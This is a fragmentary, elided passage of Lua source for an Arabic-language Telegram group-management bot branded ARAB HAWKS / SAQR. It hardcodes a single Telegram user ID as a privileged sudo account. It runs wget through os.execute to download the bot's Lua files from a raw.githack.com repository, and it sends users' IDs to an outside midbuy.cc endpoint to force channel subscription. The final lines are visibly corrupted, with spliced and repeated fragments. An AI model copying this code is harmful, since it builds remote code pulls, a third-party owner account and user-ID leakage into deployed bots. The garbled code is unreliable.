...
Id_Sudo = Sudo
List_Sudos = {Id_Sudo,1843759714,1843759714}
...
if tonumber(user_id) == tonumber(1843759714) then  
var = true  
elseif tonumber(user_id) == tonumber(1843759714) then
var = true  
...
local UserName = (data.username_ or "FFFKK")
local NameUser = "[- ARAB HAWKS  .](https://t.me/joinchat/G7Fvhi3L83tlZTEx)\n — — — — — — — — —\n⌔︙بواسطه -› ["..data.first_name_.."](T.me/"..UserName..")"
local NameUserr = "[- ARAB HAWKS  .](https://t.me/joinchat/G7Fvhi3L83tlZTEx)\n — — — — — — — — —\n⌔︙اسم المستخدم -› ["..data.first_name_.."](T.me/"..UserName..")"
if status == "lock" then
...
send(msg.chat_id_, msg.id_,"[- ARAB HAWKS  .](https://t.me/joinchat/G7Fvhi3L83tlZTEx)\n — — — — — — — — —\n⌔︙العضو -› ["..data.first_name_.."](t.me/"..(data.username_ or "FFFKK")..")".."\n⌔︙تم رفعه "..RTPA.." هنا\n")
...
if BLACKBOTSSrt == "مميز" and Addictive(msg) then
send(msg.chat_id_, msg.id_,"[- ARAB HAWKS  .](https://t.me/joinchat/G7Fvhi3L83tlZTEx)\n — — — — — — — — —\n⌔︙العضو -› ["..result.title_.."](t.me/"..(text1[3] or "FFFKK")..")".."\n⌔︙تم رفعه "..text1[2].." هنا")   
database:sadd(bot_id.."BLACKBOTSS:Special:User"..msg.chat_id_,result.id_)  
...
local UserName = (b.username_ or "FFFKK")
...
os.execute('wget https://raw.githack.com/blackedSaqr/OFFICIAL/main/BLACKBOTSS.lua')
os.execute('wget https://raw.githack.com/blackedSaqr/OFFICIAL/main/start.lua')
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '- ARAB HAWKS  .',url="https://t.me/joinchat/G7Fvhi3L83tlZTEx"}},
}
local msg_id = msg.id_/2097152/0.5
...
local url,res = https.request('https://midbuy.cc/API/join.php?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Member.info ~= true then
send(msg.chat_id_,msg.id_,'⌔︙شترك في قناة السورس اولآ [@FFFKK](https://t.me/joinchat/G7Fvhi3L83tlZTEx) .')   
return false 
end
Text = [[
*- SAQR Team .*
...
[⌔︙SAQR 𝖲𝗈𝗎𝗋𝖼𝖾  .](https://t.me/joinchat/G7Fvhi3L83tlZTEx) .
]]
send(msg.chat_id_, msg.id_,Text)
end
...
⌔︙ م5 -› لعرض اوامر المطورين
 — — — — — — — — — 
[⌔︙Ch Source](https://t.me/joinchat/G7Fvhi3L83tlZTEx)
]]
send(msg.chat_id_, msg.id_,Text)
return false
end
...
inline = {
{{text = '⌔︙ BLacK 𝖲𝗈𝗎𝗋𝖼??  .',url='https://t.me/joinchat/G7Fvhi3L83tlZTEx'}},
}
https.request("https://api.telegram.org/bot"..token.."/deleteMessage?chat_id="..Chat_id.."&message_id="..msg_idd)
send_inlin_key(Chat_id,Text,inline)
...
end;CleangGroups();end;endnd(msg.chat_id_, msg.id_,'⌔︙عذرآ البوت ليس ادمن بالقناه ')
end
return false  
end
end,nil)
...
end;CleangGroups();end;endsg.chat_id_, msg.id_,'⌔︙عذرآ البوت ليس ادمن بالقناه ')
end
return false  
end
end,nil)
